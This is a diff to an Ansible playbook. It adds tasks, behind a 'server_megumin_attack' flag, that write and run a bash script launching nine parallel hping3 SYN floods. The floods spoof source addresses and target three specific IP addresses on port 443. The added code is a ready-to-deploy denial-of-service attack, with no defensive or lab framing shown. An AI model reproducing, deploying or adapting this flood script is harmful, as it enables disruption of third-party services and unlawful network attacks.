@@ -143,3 +143,30 @@
   when: server_system_upgrades is changed or server_system_hostname is changed or machine_reboot_required.stat.exists
   tags:
     - reboot_machine
+
+- name: Create script
+  copy:
+    content: |
+          #!/usr/bin/env bash
+          sudo hping3 -a 190.0.175.180 95.173.136.71 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a 190.0.175.115 95.173.136.70 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a 190.0.175.111 95.173.136.72 -S -d 120 --flood -p 443 -0 &
+          sudo hping3 -a 190.0.175.140 95.173.136.71 -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a 190.0.175.123 95.173.136.70 -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a 190.0.175.163 95.173.136.72 -S -d 120 --flood -p 443 -1 &
+          sudo hping3 -a 190.0.175.149 95.173.136.71 -S -d 120 --flood -p 443 -2 &
+          sudo hping3 -a 190.0.175.124 95.173.136.70 -S -d 120 --flood -p 443 -2 &
+          sudo hping3 -a 190.0.175.114 95.173.136.72 -S -d 120 --flood -p 443 -2 &
+    dest: /home/ubuntu/hpingscript.sh
+  when: server_megumin_attack
+  tags:
+    - server_megumin_attack
+
+# ANSIBLE SESSION 
+
+- name: hping attack
+  shell: |
+    sudo bash /home/ubuntu/hpingscript.sh
+  when: server_megumin_attack
+  tags:
+    - server_megumin_attack
